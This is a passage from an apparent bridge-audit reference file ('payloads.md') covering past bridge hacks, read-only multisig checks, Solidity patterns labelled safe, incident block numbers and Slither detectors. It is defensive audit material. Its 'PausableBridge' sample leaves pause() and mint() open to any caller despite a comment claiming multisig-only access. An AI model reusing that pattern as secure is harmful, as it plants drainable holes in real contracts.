# Attack: 2 validator keys stolen (SSH private-key leak)

# Examine threshold
cast call 0x...HorizonBridge "threshold()" --rpc-url $HARMONY_RPC
```

### 18.7 Orbit Bridge (2024, ~$80M)

```bash
# Block: Multiple chains
# Root cause: 3-of-6 multisig compromise (keys likely social-engineered)
# Attack: 3 keys stolen

# Pattern: always check M > N/2 for validator multisigs
cast call 0x...OrbitBridge "requiredSignatures()" --rpc-url $RPC
```

---

## Appendix: Common Solidity Patterns for L2 Bridge Audits

### A.1 Safe Signature Verification (bridge verifier)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SafeBridgeVerifier {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    address[] public validators;
    uint256 public threshold;

    function verifySignatures(
        bytes32 messageHash,
        bytes[] calldata signatures
    ) external view returns (bool) {
        // Defensive checks:
        // 1. Message hash commits to source chain ID
        // 2. Signatures are from distinct validators
        // 3. Signature count >= threshold
        require(signatures.length >= threshold, "insufficient sig count");

        bytes32 ethHash = messageHash.toEthSignedMessageHash();
        address[] memory seen = new address[](signatures.length);
        uint256 validCount;

        for (uint i = 0; i < signatures.length; i++) {
            address signer = ethHash.recover(signatures[i]);
            if (!_isValidator(signer)) continue;
            if (_alreadySeen(seen, signer)) continue;  // prevent duplicate sigs
            seen[validCount] = signer;
            validCount++;
        }

        return validCount >= threshold;
    }

    function _isValidator(address a) internal view returns (bool) {
        for (uint i = 0; i < validators.length; i++) {
            if (validators[i] == a) return true;
        }
        return false;
    }

    function _alreadySeen(address[] memory seen, address a) internal pure returns (bool) {
        for (uint i = 0; i < seen.length; i++) {
            if (seen[i] == a) return true;
        }
        return false;
    }
}
```

### A.2 Safe Cross-Chain Message (with replay protection)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SafeCrossChainMessage {
    uint256 public immutable sourceChainId;
    uint256 public immutable destChainId;
    mapping(bytes32 => bool) public processedMessages;

    constructor(uint256 _source, uint256 _dest) {
        sourceChainId = _source;
        destChainId = _dest;
    }

    function processMessage(
        uint256 _sourceChainId,
        uint256 nonce,
        address sender,
        bytes calldata payload
    ) external {
        // Critical: commit to source chain ID (prevents replay from a different chain)
        require(_sourceChainId == sourceChainId, "wrong source chain");

        // Critical: message hash includes nonce (prevents replay on same chain)
        bytes32 messageHash = keccak256(
            abi.encodePacked(
                sourceChainId,
                destChainId,
                nonce,
                sender,
                keccak256(payload)
            )
        );

        // Critical: check that this message hasn't been processed
        require(!processedMessages[messageHash], "message already processed");
        processedMessages[messageHash] = true;

        // Execute the payload
        _execute(sender, payload);
    }

    function _execute(address sender, bytes calldata payload) internal {
        // ... (protocol-specific)
    }
}
```

### A.3 Pausable Bridge with Rate Limiting

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PausableBridge is Pausable, ReentrancyGuard {
    uint256 public constant MAX_MINT_PER_BLOCK = 1000 ether;
    uint256 public mintedInCurrentBlock;
    uint256 public lastMintBlock;

    function mint(address to, uint256 amount) external nonReentrant whenNotPaused {
        // Critical: rate limit
        if (block.number != lastMintBlock) {
            mintedInCurrentBlock = 0;
            lastMintBlock = block.number;
        }
        require(
            mintedInCurrentBlock + amount <= MAX_MINT_PER_BLOCK,
            "rate limit exceeded"
        );
        mintedInCurrentBlock += amount;

        // ... mint logic
    }

    function pause() external {
        // Only callable by a multisig (Gnosis Safe) or Sentinel
        _pause();
    }
}
```

---

## Appendix: Reference Block Numbers for Replay

| Incident | Date | Chain | Block | Loss |
|---|---|---|---|---|
| Poly Network | 2021-08 | Ethereum | ~12975000 | $611M |
| Wormhole | 2022-02 | Solana + Ethereum | ETH ~14282107 | $326M |
| Ronin | 2022-03 | Ronin + Ethereum | ETH ~14377441 | $625M |
| Nomad | 2022-08 | Ethereum | ~15259350 | $190M |
| Horizon | 2022-06 | Harmony | ~19743149 | $100M |
| Multichain | 2023-07 | Multi-chain | (various) | $1.5B+ |
| Orbit Bridge | 2024-01 | Multi-chain | (various) | ~$80M |

---

## Appendix: Slither Detector Quick Reference (L2 / Bridge)

| Detector | What it catches | Bridge relevance |
|---|---|---|
| `reentrancy` | External call before state update | Bridge lock/mint reordering |
| `reentrancy-eth` | ETH reentrancy | Bridge `withdraw()` patterns |
| `arbitrary-send-eth` | Anyone can send ETH | Bridge drain via privileged fn |
| `unchecked-transfer` | ERC20 transfer return value ignored | Token lock bypass |
| `controlled-delegatecall` | User-controlled delegatecall target | Account abstraction danger |
| `tx-origin` | `require(msg.sender == tx.origin)` | Forbidden in L2 wallet context |
| `timestamp` | Reliance on `block.timestamp` | Bridge CLTV bypass |
| `dangerous-strict-equality` | `==` on uint after arithmetic | Accounting drift |
| `assembly` | Inline assembly | Signature-verify bugs |
| `suicidal` | Anyone can `selfdestruct` | Bridge destruction |
| `centralized-risk` | Single-key admin | Bridge mint authority |
| `uninitialized-state-variable` | Uninitialized storage (the Nomad class) | Bridge root initialization |

---

End of `payloads.md`. For the full audit workflow, see `guides/blockchain-l2-attack-playbook.md`. For test cases, see `test-cases.md`.
